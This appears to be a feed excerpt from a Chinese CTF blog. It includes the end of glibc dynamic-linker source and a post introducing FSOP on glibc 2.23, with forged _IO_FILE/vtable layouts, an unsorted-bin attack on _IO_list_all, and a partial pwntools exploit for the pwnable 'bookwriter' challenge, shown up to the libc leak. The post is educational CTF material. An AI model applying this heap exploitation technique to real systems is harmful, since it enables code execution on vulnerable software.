class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Auditing checkpoint: we have a new binding.  Provide the auditing</span></span><br><span class="line"><span class="comment">     libraries the possibility to change the value and tell us whether further</span></span><br><span class="line"><span class="comment">     auditing is wanted.</span></span><br><span class="line"><span class="comment">     The l_reloc_result is only allocated if there is an audit module which</span></span><br><span class="line"><span class="comment">     provides a la_symbind.  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_reloc_result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This is the address in the array where we store the result of previous</span></span><br><span class="line"><span class="comment"> relocations.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span> *<span class="title">reloc_result</span></span></span><br><span class="line"><span class="class">=</span> &amp;l-&gt;l_reloc_result[reloc_index (pltgot, reloc_arg, <span class="keyword">sizeof</span> (PLTREL))];</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> init = atomic_load_acquire (&amp;reloc_result-&gt;init);</span><br><span class="line">      <span class="keyword">if</span> (init == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _dl_audit_symbind (l, reloc_result, reloc, sym, &amp;value, result, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Store the result for later runs.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (! GLRO(dl_bind_not)))</span><br><span class="line">    &#123;</span><br><span class="line">      reloc_result-&gt;addr = value;</span><br><span class="line">      <span class="comment">/* Guarantee all previous writes complete before init is</span></span><br><span class="line"><span class="comment"> updated.  See CONCURRENCY NOTES below.  */</span></span><br><span class="line">      atomic_store_release (&amp;reloc_result-&gt;init, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">value = reloc_result-&gt;addr;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">elf dynamic link</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="基础" scheme="https://ixout.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="elf" scheme="https://ixout.github.io/tags/elf/"/>
    
  </entry>
  
  <entry>
    <title>初探FSOP</title>
    <link href="https://ixout.github.io/posts/6507/"/>
    <id>https://ixout.github.io/posts/6507/</id>
    <published>2023-07-21T05:06:13.000Z</published>
    <updated>2023-10-20T15:29:55.248Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h1><p>FSOP 是 File Stream Oriented Programming 的缩写。所有的 _IO_FILE 结构会由 _chain 字段连接形成一个链表，<strong>由全局变量 _IO_list_all 来维护表头</strong>。而 FSOP 的核心思想就是劫持通过 _IO_list_all 的值来伪造链表和其中的 _IO_FILE 项。</p><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>先看FSOP技术利用的核心函数<strong>_IO_flush_all_lockp</strong></p><p>该函数会刷新_IO_list_all 链表中所有项的文件流，<strong><u>相当于对每个 FILE 调用 fflush(更新缓存区函数)</u></strong>，也对应着会调用vtable 中的_IO_overflow(以当前io_file指针为参数)。</p><p>关键部分如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可见要执行_IO_OVERFLOW的前提是:</p><ol><li><strong>fp-&gt;_mode&lt;=0</strong></li><li><strong>fp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</strong></li></ol><p>或者:</p><ol><li><strong>fp-&gt;_mode &gt; 0</strong></li><li><strong>_IO_vtable_offset (fp) == 0</strong></li><li><strong>fp-&gt;_wide_data-&gt;_IO_write_ptr&gt;fp-&gt;_wide_data-&gt;_IO_write_bas</strong></li></ol><p>其中<code># define _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</code>就是获得_IO_FILE结构体中的_vtable_offset</p><p><strong>这二者都是可行的,不过个人比较喜欢用前者更方便</strong></p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>那么该如何调用<strong>_IO_flush_all_lockp</strong></p><p>_IO_flush_all_lockp 在以下三种情况下会被系统调用：</p><ol><li><strong>当执行 abort 流程时</strong></li><li><strong>当执行 exit 函数时</strong></li><li><strong>当执行流从 main 函数返回时</strong></li></ol><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p>在堆中,触发错误时的malloc_printer函数会调用abort</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/abort_routine.001.jpeg" alt=""></p><h1 id="2-23利用"><a href="#2-23利用" class="headerlink" title="2.23利用"></a>2.23利用</h1><p>从以上可知只要分别伪造_IO_FILE和vtable,部署好函数调用</p><p>例如除绕过检测之外</p><ol><li>在IO_FILE开头写上b’/bin/sh\0’</li><li>IO_OVERFLOW写为system</li></ol><p>就能getshell</p><p><strong>IO_FILE</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//宏定义,如果宏_IO_USE_OLD_IO_FILE会把_IO_FILE拆成两个部分</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>IO_FILE_plus</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>vtable</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>利用<strong>unsortedbin attack</strong>往IO_list_all中写入main_arena+0x58</p><p>由于_chain字段在_IO_FILE中的偏移是0x68</p><p>那么就会将真实大小为0x60chunk的bk字段视为_chain字段,故该bk需指向fake_IO_FILE</p><p>所以fake_IO_FILE需要被加入0x60的smallbin中,并确保是最后一个chunk</p><p>一般是触发从unsortedbin往外取出,放入smallbin后,继续取出(IO_list_all-0x10)但因为大小不通过检测,触发malloc_printer,以此getshell</p><p>IO_list_all-0x10视为chunk的话size字段是空的(固定内存)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>不过在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。会验证 vtable 是否位于_IO_vtable 段中,这就使得这种办法失效了</p><h2 id="实战pwnable-bookwriter"><a href="#实战pwnable-bookwriter" class="headerlink" title="实战pwnable_bookwriter"></a>实战pwnable_bookwriter</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bw&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>libc是2.23</p><p>主要漏洞点:</p><ol><li>根据内存判断应该只能存储8个book,但是add函数判断时是if(a&gt;8)结合函数功能会将一个book的size覆写为一个地址(一个很大的数值)</li><li>edit函数后会将book的size根据新输入的字符串调整,如果和下一个chunk的size连接起来就可以多写一个字节到下一个chunk</li><li>author长度为0x40时,可以向下继续泄露地址</li></ol><p>利用核心:</p><ol><li>这题没有free功能,要想泄露libc就要对topchunk动手脚(本体可以修改其大小,再申请一个比修改后的size大的大小,使topchunk加入unsortedbin)</li><li>具体的漏洞利用实现要用到FSOP</li><li>topchunk在这道题中非常关键</li></ol><p>实现过程:</p><ol><li>泄露heap</li><li>通过topchunk进入unsortedbin泄露libc</li><li>第0个chunk大数字写伪造io_file和vtable</li><li>申请chunk利用unsortedbin attack写IO_file,并让fake_iofile加入到smallbin链并成功进入fake_io_list_all,并因为unsortedbin链损坏触发malloc_printer以此getshell</li></ol><p>触发trigger(将IO_list_all-0x10视为chunk起始的话,size==0)</p><p><strong>exp:</strong>(有小概率失败,可能是ASLR的影响)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./bw&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;page :&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Author :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)  <span class="comment">#top chunk size edit</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1\x0f\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(yes:1 / no:0) &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#add top chunk to unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">libc_addr  = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_base: &#x27;</span>, <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_addr:&#x27;</span>, <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;system: &#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;heap: &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span 